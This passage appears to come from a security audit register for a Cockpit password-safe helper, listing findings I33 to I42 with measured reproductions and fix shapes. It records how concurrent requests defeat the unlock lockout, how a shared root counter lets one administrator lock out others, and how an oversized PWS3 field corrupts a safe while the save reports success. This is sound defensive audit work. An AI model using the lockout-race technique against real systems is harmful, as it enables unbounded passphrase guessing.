**Mitigation:** `add_entry` is called with CONSTANT empty strings for title and username, which
removes the caller's text from the query rather than escaping it, and the two fields are then
written by `_set_field` — the same element-text technique §7 used for `reveal()`. (`None` would
skip the filter entirely and is tidier still, but pykeepass hands it to `E.Value()` and lxml
refuses it.) `_map_pykeepass_error` maps `lxml.etree.XPathError` to `invalid` rather than
`internal`, because a query WE built is never "we do not know what went wrong".
`validate.sh` bans `find_entries` / `find_groups` / `find_attachments` / `set_custom_property`
from `backends/kdbx.py` outright and pins the `add_entry` call site.

Guards: `test_leakage04_*` (three, including the §7 `reveal` payload as a control) and the
LEAKAGE-04 section of `adversarial.py`.

### I33 · Two honesty defects in the answers the helper gives · Sev L · MITIGATED
Grouped because each is one sentence of cause and neither is an exposure.

**A deeply nested request answered `internal`.** `parse_request` caught `ValueError` from
`json.loads`; a body of 100 000 open brackets raises `RecursionError`, which is a
`RuntimeError`, so it reached the top-level barrier and came back as
`{"error": "internal", "detail": "RecursionError"}` — in the same breath as a caller who sent
`not json` correctly getting `invalid`. `internal` is reserved for "we do not know what went
wrong" and for a request frame we always do: the caller sent it. The cost is bounded by Python's
own recursion limit (about 0.1 s), so this is taxonomy, not a denial of service — but the audit
log and the client both key off that code to tell a bad request from a broken helper. Now
`invalid: the request is nested too deeply to parse`, with a standing ban on the handler LINE,
not the word: a first version of the ban grepped for `RecursionError` and passed with the
handler deleted and the explaining comment left behind.

**`restore-backup` claimed more than it could deliver.** Every reply carried
`"note": "…so this restore is itself undoable"`, and the verb table shipped the same sentence as
its confirm text. The ring is a fixed-size ring of `keep` generations and every restore pushes
one more in, so after `keep` restores no generation holds the state the operator started from.
Measured with keep=3: four ordinary saves then five restores left the starting state in zero of
three slots, with every reply still saying "undoable". The reply now carries `undo` — a sentence
computed from the ring AFTER the write — and `ring_full`, so a caller can warn before the ring
starts discarding rather than after; the confirm text says the same thing. (The finding also
claimed this as an unauthenticated destruction path for A4. The skeptic refuted that half: script
in the Cockpit origin has `cockpit.spawn` with arbitrary argv and can simply unlink a user-class
safe, so the verb grants no primitive such an attacker lacks, and an admin-class safe needs the
superuser bridge, i.e. root, which is out of scope. What is left is an over-claiming confirm
string, which is what was fixed.)

Guards: the INPUT-2 and DURABILITY-3 sections of `adversarial.py`.

### I34 · Live-suite artefacts were written under the umask · Sev L · MITIGATED
`tests/browser/artifacts/.gitignore` states that a screenshot taken between "Reveal" and the
countdown ending is *a screenshot OF A PASSWORD* and that "the suite writes them 0600 for the
same reason". `writeArtifact` did pass `{ mode: 0o600 }` — for the console log and the JSON
results, which carry no secret. The two artefacts that DO contain plaintext secret material were
written by `page.screenshot({path})` and `download.saveAs()`, neither of which has a mode
option, so both landed under the 0002 umask as `-rw-rw-r--` on an SMB-exported tree, and
`run-live.sh` set no umask. Verified by opening the file: `03-revealed.png` shows an unmasked
Password field reading `already-expired` in a live Cockpit session, and the `.bin` holds the
decrypted attachment body.

No in-scope adversary could read them (`/srv/smb/share` is `drwxrws--- root:smbusers` and
`smbusers` has one member; `cptest` gets EACCES), and the passphrase in that run is the published
fixture one — so this is a stated control that was not in force, not a disclosure. It is fixed
anyway because docs/LIVE-WALKTHROUGH.md documents the harness as running against **this host's
real registry**, where the same code path would photograph a production password.

**Mitigation:** every artefact goes through `lockDown()` in `live-harness.js`, which chmods
0600; `saveDownload()` wraps the Playwright call so no spec calls `saveAs` directly;
`run-live.sh` sets `umask 077` as the belt to that brace; and `validate.sh` checks all three.
The artefacts already on disk were chmod'ed 0600.

Guard: `test_leakage02_*` (two).

### I35 · A hardware token's answer is a file constant · Sev L · OPEN, argued
`_serialize` rotates the master seed, the encryption IV and the inner stream key on every save
and deliberately does NOT rotate the KDF seed — it cannot, because it does not hold the
passphrase. But `challenge_for()` sends the KDF seed to the token as the challenge, so the
20-byte HMAC-SHA1 answer that opens a safe never changes. KeePassXC's `Kdbx4Writer` calls
`Kdf::randomizeSeed()` on every save and re-challenges the token, so there a captured answer
stops working at the operator's next save; here it works for as long as the file exists.

**This one is NOT mechanically fixed, and the argument is in docs/RESIDUAL-RISK.md §1.** In
short: rotating the seed for a challenge-response database requires a fresh token answer at SAVE
time, which the unlock protocol has no round for, and the two available mechanisms — a second
challenge round, or holding the composite key and paying a full KDF on every save — were judged
worse than the bug for a deviation whose only in-scope observer (A4/XSS) captures the passphrase
in the same keystroke. What was NOT acceptable was leaving it silent: `probe` and `unlock` now
both warn, in the operator's own words, that the token's answer for this file is the same value
every time.

Guards: `test_crypto03_constant_challenge_is_stated`, and
`test_crypto03_the_challenge_is_still_the_kdf_seed` as the reminder that a future change which
DOES rotate the seed must take the warning with it.

---

## Found by the re-gate of 0.2.1, after the remediation reported every gate green

The remediation of I23–I35 answered fourteen findings and left `./run_tests.sh` 17/17,
`./validate.sh` 47/0 and 38 new unit regressions green. The entries below were found by
re-gating that result on **2026-09-04** — by re-running every gate from a clean state,
installing the build on the host for the first time, and re-attacking the two places the
adversarial pass had left as "code-visible but unreproduced".

Two of them are defects the attack pass had already named and the remediation did not close:
**I41** is `CRYPTO-02`, which the remediation states in writing that it fixed and did not, and
**I39** is `WEB-01`, which appears in no remediation entry at all. That is the same failure the
whole exercise exists to catch, one level up: a remediation report is also written by the system
that wrote the fix.

`docs/STRESS-REPORT.md` carries the full command and output for each.

### I36 · A downloaded attachment outlives the Lock button · Sev L · OPEN
`downloadAttachment()` (`secrets.js:4715-4725`) hands the decrypted bytes to the browser as a
blob URL and revokes it on a fixed 10 s `setTimeout`. `lockNow()` does not revoke it, and there
is no other `revokeObjectURL` in the file. So for up to ten seconds after the operator has
explicitly locked the safe, the browser is still holding the plaintext of an attachment.

**Measured in the live page**, with `URL.createObjectURL`/`revokeObjectURL` hooked from a context
init script: after Lock, `revoked=0` and the URL was still valid, and a synthetic `<a download>`
click **succeeded** — 47 decrypted bytes written to disk on a safe the operator had closed.

**What limits it, and this is measured too.** Script cannot *read* the bytes: `fetch` against the
blob is refused by the package's own Content-Security-Policy with Chrome naming the directive
(`connect-src <- blob`), and because the blob is deliberately typed `application/octet-stream`
(the comment at the call site explains why), a `window.open` navigation yields an empty document
rather than a rendered one. So I9's refusal to relax the CSP is doing work here that it was not
designed for. What remains is that an attacker already in the origin (A4) can put a second copy
of an already-downloaded attachment on the operator's disk inside that window.

**Not fixed here.** The obvious fix — revoke in `lockNow()` — is safe, because the 10 s timer
exists only to let an in-flight save finish and a Lock is not in flight. It is left for a change
that can carry its own browser regression test.

### I37 · `clipboardClear()` announces success before the write resolves · Sev L · OPEN, NOT REPRODUCED
`clipboardClear()` (`secrets.js:2604`) clears the interval and sets `CLIP.armed = false` **before**
calling `navigator.clipboard.writeText("")`, catches a rejection with a bare
`/* best effort */`, and then unconditionally announces "Clipboard cleared because …". If that
write ever rejects — Chrome's documented "Document is not focused" is the obvious case, and the
two most common triggers for this function are `pagehide` and `visibilitychange → hidden` — the
password stays on the clipboard, the countdown is gone, nothing retries, and the operator is told
it worked.

**Nobody has made it fail.** Two independent lenses tried: Playwright's Chromium never let a tab
actually become hidden or lose focus (`visibilityState` stayed `"visible"` and
`document.hasFocus()` stayed `true` through `bringToFront()` on a second tab, headless **and**
headed under Xvfb), and revoking the `clipboard-write` permission mid-countdown did not produce a
rejection. The happy path is verified live: write #1 (len 26) resolved, the chip counted down, at
t+15 s write #2 (len 0) resolved and `readText()` returned `""`.

This is recorded rather than reported as a defect, because the failure it describes has never
been observed. Confirming it needs a person at a real desktop browser who can defocus the tab.
I17 already states that clipboard clearing is best-effort; what is not stated is that the page
announces success without checking.

### I38 · The agent's `_note()` does not redact · Sev L · OPEN
`secrets-admin::_note()` writes `redact(str(msg))`; `agent/secrets_agent.py::_note()` writes the
message straight to stderr. Every current call site in the agent passes either a static string or
an already-redacted `SecretsError.detail`, so **there is no live escape and none is claimed** —
this is a hole in a last line of defence, reachable only through a coding mistake that has not
been made. That is the same shape as I30, and the same reason it is worth closing: the value of a
blanket filter is that it covers the mistake nobody has made yet. `validate.sh` does not check
this, which is why the asymmetry survived.

### I39 · The unlock lockout does not survive concurrency · Sev M · OPEN
This is the attack pass's `WEB-01`. It appears in no remediation entry.

`lockout_fail()` reads the counter, computes, and writes it back with `O_TRUNC`, with no lock
between the three steps, and `lockout_check()` runs before the KDF while `lockout_fail()` runs
after — so the race window is the whole derivation. Fired at a hermetic registry with wrong
passphrases and the counter cleared before each batch:

```
sequential control, 8 guesses one at a time  -> 1 evaluated, then 7 × locked-out
10 concurrent -> {'bad-credential': 10}                  10 evaluated
25 concurrent -> {'bad-credential': 22, 'locked-out': 3} 22 evaluated
50 concurrent -> {'bad-credential': 44, 'locked-out': 6} 44 evaluated
   counter after the 50: {"failures": 43, …}   -- 7 increments lost as well
```

Guessing still costs a full KDF per attempt and the constant-time floor is untouched, so this is
not an offline attack. What is defeated is the promise that guessing is bounded by a **threshold**
rather than only by CPU. Reachable by anyone who can spawn the helper repeatedly: the owner of a
user-class safe, or script in the Cockpit origin driving `cockpit.spawn` in a loop.

**Fix shape:** hold the safe's lock file, or an `O_EXCL` sidecar, across the read-modify-write; or
make the counter an append-only file whose length is the count.

### I40 · Every administrator shares one lockout counter per admin safe · Sev M · OPEN
`_lockout_path()` (`secrets-admin:1203`) builds `"fail.%d.%s.json" % (os.geteuid(), safe_id)`. On
the admin path every operator is euid 0, so there is one counter per admin safe for everybody.
`ident.real_uid` is available at that line and is not used. I16 and `docs/ARCHITECTURE.md` step 6
both say the counter is per-**(uid, safe id)**.

The browser lens found this by reading and could not reproduce it, because reaching euid 0 needs
the superuser path `cptest` cannot obtain. Reproduced through the `/srv/jobs` root runner against
a real root-owned admin-class entry:

```
operator A (SUDO_UID=1000) mistypes ONCE
counter files on disk: fail.0.zz-lockout-probe.json      <- one file, euid not uid
operator B (SUDO_UID=1007), who has typed nothing, offers the CORRECT passphrase
   -> locked-out
```

Two consequences: one administrator's typo denies the safe to every other administrator, and the
lockout state cannot attribute — it records no identity, so it cannot say whose failures they
were. (The audit log does record that.)

**Fix shape:** key the path on `ident.real_uid`, falling back to euid when there is no
`SUDO_UID`/`PKEXEC_UID`, and say in I16 which identity is meant.

### I41 · PWS3 never got I24's per-save reader check · Sev M · OPEN
This is the attack pass's `CRYPTO-02`, and I24 states that it was fixed. It was not — see the
CORRECTION in I24.

`backends/kdbx.py` `save()` calls `_assert_lossless()` **and then `_verify_own_output(data)`**, so
the reader re-runs on every save. `backends/psafe3.py` `save()` calls `_ensure_lossless()` and
nothing else, and `_ensure_lossless()` short-circuits on `self._lossless_checked`, which is set
`True` on its first run and cleared only in `lock()`. So on PWS3 the I22 round-trip guard runs
once per session, exactly as before the remediation.

Reproduced against the real backend on a copy of the committed fixture:

```
save 1 (ordinary edit)  : True    latch AFTER save 1: True   <- guard now off for the session
save 2, 5 MiB notes field in the SAME session
   save -> {'ok': True, 'bytes': 5244200}     file REWRITTEN
   reopen -> BadCredential: "the passphrase did not open this safe"
   (reader, on stderr: "PWS3 field length 5242880 exceeds the 4194304 byte limit")
```

The safe is destroyed, the save reports success, and the reader then blames the operator's
passphrase — the one answer that will send them to guess again and trip I39/I40 on a safe that is
broken rather than locked. The previous generation is in the backup ring, so this is recoverable
data loss.

I23 states the principle this breaks in its own words: *"the read and write limits are now the
same number and this program cannot write a file its own reader refuses."* True for KDBX; false
for PWS3.

**How far it reaches today, measured.** Not through the shipping helper by this route:
`MAX_REQUEST_BYTES` is 1 MiB and `edit` carries the whole new value, so the frame that would set a
>4 MiB field is refused and the session closes. `serialize()` does still check `MAX_SAFE_BYTES`,
so the whole-file-too-big route is caught. What is unguarded is the per-field cap, and the only
thing in the way is a transport limit that exists for an unrelated reason. Any caller that reaches
the backend directly — a future verb, the agent, a script — has no such limit.

**Fix shape:** give `Psafe3Backend.save()` and `save_as()` the same `_verify_own_output` treatment
`KdbxBackend` has, and add the PWS3 twin of
`test_crypto01_save_refuses_output_it_cannot_read_back`. The absence of that twin is why the
false claim in I24 survived review.

### I42 · The live suite's I11 storage check is a false statement · Sev L · OPEN (test defect)
`live-ui.spec.js` item 4 asserts that an unlock added no key to either web-storage area, treating
a key whose VALUE CHANGED LENGTH as added. The intent is right and the comment says so:
*"overwriting Cockpit's own key with a passphrase would otherwise slip through a names-only
comparison."*

But a Cockpit package page is an iframe on the shell's own origin, and Cockpit's shell writes and
rewrites `sessionStorage["cockpit:page_status"]` on behalf of stock pages. Measured with this
package never opened in the browser context:

```
after login             session=["cockpit:v2-machines.json"]
after stock /system     session=["cockpit:page_status","cockpit:v2-machines.json"]
   value names "updates" and "system/services"; mentions 'secret'? false
and it changes length while it sits there:
   t+2s len=235 "Checking for package updates..."   t+20s len=223 "Security updates available"
```

That 235→223 transition is exactly what item 4 flagged. Both live runs of this re-gate failed on
it — in run 1 the key was absent from the baseline and appeared; in run 2 it was present and
changed length. `secrets.js` contains no `page_status` and two standing gates assert it names no
browser storage API at all; both PASS. The page is byte-identical (`secrets.js` sha256
`7f03c81c…`) to the one that scored 140/140.

Every assertion in item 4 that would catch a real leak passed: no storage key belongs to this
package, no IndexedDB database was opened, and the passphrase is in neither storage area, no
cookie, no DOM node and no live input.

**Deliberately not fixed by the re-gate.** Editing an oracle so that a number comes out right is
the exact failure this exercise exists to catch, and this assertion should be re-armed by somebody
who is not also reporting on it. **Fix shape:** for a key that changed, ask *inside the page*
whether the new value contains the passphrase or a marker from this package and return a boolean —
strictly stronger than a length comparison, which a same-length overwrite already defeats.
